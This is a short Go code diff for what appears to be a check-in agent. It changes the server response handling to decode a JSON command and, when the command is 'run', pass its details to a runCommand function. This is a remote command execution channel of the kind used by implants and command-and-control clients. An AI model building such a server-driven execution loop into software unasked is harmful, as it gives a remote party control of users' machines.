@@ -4,7 +4,8 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
+
+	// "io/ioutil"
 	"log"
 	"net/http"
 	"os"
@@ -31,6 +32,12 @@ type CheckIn struct {
 	ID string `json:"ID"`
 }
 
+type command struct {
+	ID      string `json:"ID"`
+	Command string `json:"command"`
+	Details string `json:"details"`
+}
+
 func checkIn() {
 
 	data := map[string]string{"ID": NodeID}
@@ -55,27 +62,27 @@ func checkIn() {
 		panic(err)
 	}
 
+	//shrug
 	defer res.Body.Close()
 
 	fmt.Println(res.StatusCode)
 
-	// Parse the text response code
-	ResponseData, err := ioutil.ReadAll(res.Body)
-	if err != nil {
-		panic(err)
+	// Parse the JSON response
+	post := &command{}
+	derr := json.NewDecoder(res.Body).Decode(post)
+	if derr != nil {
+		panic(derr)
 	}
 
-	fmt.Println(string(ResponseData))
+	// Output the JSON response
+	fmt.Println("ID: ", post.ID)
+	fmt.Println("Command: ", post.Command)
+	fmt.Println("Details: ", post.Details)
 
-	// post := &CheckIn{}
-	// derr := json.NewDecoder(res.Body).Decode(post)
-	// if derr != nil {
-	// 	panic(derr)
-	// }
-
-	// if res.StatusCode != http.StatusCreated {
-	// 	panic(res.Status)
-	// }
+	// If the command is run, then the the command
+	if post.Command == "run" {
+		runCommand(post.Details)
+	}
 
 }
 
